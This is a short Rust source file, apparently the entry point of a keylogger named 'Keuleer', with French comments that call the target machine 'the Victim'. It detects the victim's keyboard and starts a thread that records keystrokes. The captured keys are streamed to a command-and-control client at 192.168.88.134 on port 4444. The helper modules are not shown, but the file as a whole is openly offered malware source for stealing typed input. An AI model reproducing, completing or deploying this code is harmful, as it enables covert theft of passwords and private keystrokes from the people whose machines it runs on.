mod modules;

use std::sync::mpsc;
use std::thread;

fn main() {
    println!("{}", "  _  __          _                 ");
    println!("{}", " | |/ /___ _   _| | ___  ___ _ __  ");
    println!("{}", " | ' // _ \\ | | | |/ _ \\/ _ \\ '__| ");
    println!("{}", " | . \\  __/ |_| | |  __/  __/ |    ");
    println!("{}", " |_|\\_\\___|\\__,_|_|\\___|\\___|_|    ");
    println!();

    // ✅ Détecter le clavier
    let device = modules::logger::detect_keyboard_device()
        .expect("❌ Aucun clavier détecté sur la Victime.");
    println!("[+] Clavier détecté : {}", device);

    // ✅ Canal pour les frappes
    let (tx, rx) = mpsc::channel();

    // ✅ Thread keylogger : lit les touches et envoie via tx
    let device_clone = device.clone();
    thread::spawn(move || {
        modules::logger::start_keylogger(&device_clone, tx);
    });

    // ✅ Client C2 : reçoit du rx et push au C2
    modules::network::start_c2_client(rx, "192.168.88.134", 4444);
}
